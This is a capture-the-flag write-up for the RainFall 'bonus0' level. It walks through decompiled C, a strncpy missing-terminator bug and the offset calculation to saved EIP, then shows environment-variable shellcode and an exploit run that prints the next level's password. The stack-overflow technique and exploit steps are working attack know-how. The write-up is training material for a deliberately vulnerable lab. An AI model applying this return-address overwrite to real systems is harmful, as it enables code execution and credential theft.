## Phase 1: Reconnaissance

We find a binary named `bonus0` in the home directory

The program reads two lines and joins them with a space:

```console
bonus0@RainFall:~$ ./bonus0
 -
hello
 -
world
hello world
```

Inputs longer than 20 characters are truncated. When the first line is exactly 20 characters, the output begins to contain data from the second line as well. Longer combinations eventually crash the program

This behavior points to a missing string terminator rather than a direct overflow in the input function

---

## Phase 2: Static Analysis

The decompiled program is equivalent to:

```c
char *p(char *destination, const char *prompt)
{
    char input[4096];

    puts(prompt);
    read(0, input, 4096);
    *strchr(input, '\n') = '\0';
    return strncpy(destination, input, 20);
}

char *pp(char *destination)
{
    char first[20];
    char second[20];
    size_t length;

    p(first, " - ");
    p(second, " - ");

    strcpy(destination, first);
    length = strlen(destination);
    destination[length] = ' ';
    destination[length + 1] = '\0';
    return strcat(destination, second);
}

int main(void)
{
    char buffer[42];

    pp(buffer);
    puts(buffer);
    return 0;
}
```

The important rule is that `strncpy(destination, input, 20)` does not append `\0` when the input contains 20 or more bytes before its null terminator

In `pp()`, `first` is immediately followed by `second` on the stack. If `first` contains 20 non-null bytes, `strcpy(destination, first)` reads through the end of `first` and continues into `second`

The later `strcat()` appends `second` one more time. That second copy is what reaches beyond the 42-byte buffer in `main`

---

## Phase 3: Locating the Saved Return Address

GDB gives us the address of the destination buffer before `pp()` is called:

```text
buffer start = 0xbffff706
```

At the `ret` instruction in `main`, the saved return address is at:

```text
saved EIP = 0xbffff73c
```

The exact overwrite offset is therefore:

```text
0xbffff73c - 0xbffff706 = 0x36 = 54 bytes
```

We need bytes 54 through 57 of the final concatenated string to contain our replacement return address

---

## Phase 4: Deriving the Two Input Lines

The first input is 20 `A` bytes. Because it completely fills `first`, that array has no null terminator

The second input contains 19 bytes before its newline:

```text
[14 x "B"][return address: 4 bytes][1 x "B"]
```

The two string operations then produce this layout:

```text
final offset   contents
------------   ---------------------------------------------
0-19           first input: 20 x "A"
20-38          second input: 19 bytes, read through by strcpy
39             inserted space
40-53          first 14 bytes of second input, appended again
54-57          replacement return address
58             final alignment byte
59             null terminator
```

The extra byte after the address is significant. It makes the second string 19 bytes long, so the first `strcpy()` produces 39 bytes and `strcat()` begins its repeated copy at offset 40. Without it, the repeated copy starts one byte earlier and the address does not align with saved EIP

---

## Phase 5: Storing Shellcode in the Environment

The overflow gives us control of the return address, but the 42-byte destination is too small for the complete payload. We place the shellcode in an environment variable instead

The included generator emits a 40-byte NOP sled followed by null-free shellcode that runs:

```text
/bin/cat /home/user/bonus1/.pass
```

We export it, then compile the address helper:

```console
bonus0@RainFall:~$ export shellcode="$(python resources/shellcode_gen.py)"
bonus0@RainFall:~$ gcc resources/get_env.c -o /tmp/get_env
bonus0@RainFall:~$ /tmp/get_env
0xbfffff07
```

The address above is the value observed in this RainFall VM session. Environment addresses depend on the environment and executable path, so we must use the address reported during the evaluation rather than treating it as universal. The NOP sled tolerates a small difference between the helper process and the vulnerable program

The binary has an executable stack (`GNU_STACK` is `RWE`), allowing execution from the environment area of the process stack

---

## Phase 6: Exploitation

`resources/exploit.py` builds the two lines and accepts the observed environment address as an argument. It also pauses briefly between writes; otherwise the first 4096-byte `read()` could consume both lines from the pipe

```console
bonus0@RainFall:~$ python resources/exploit.py 0xbfffff07 | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB... BBBBBBBBBBBBBB...
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

When `main()` returns, saved EIP points into the environment NOP sled. Execution slides into the shellcode, which prints the password for bonus1
